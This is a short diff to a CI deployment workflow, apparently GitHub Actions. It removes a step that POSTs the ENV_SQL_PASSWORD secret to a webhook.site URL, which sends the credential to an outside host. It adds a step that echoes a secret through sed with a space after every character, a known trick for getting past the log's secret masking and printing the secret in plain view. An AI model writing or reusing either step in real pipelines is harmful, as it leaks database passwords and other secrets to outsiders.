@@ -8,9 +8,5 @@ jobs:
       - name: Deploy Stage
         env:
           ENV_SQL_PASSWORD: ${{ secrets.ENV_SQL_PASSWORD }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/#!/48e21e87-581b-4a33-9120-1c21615c88b8'
-          method: 'POST'
-          customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.ENV_SQL_PASSWORD }}
+        run:
+          echo ${{secrets.SECRET_NAME}} | sed 's/./& /g'
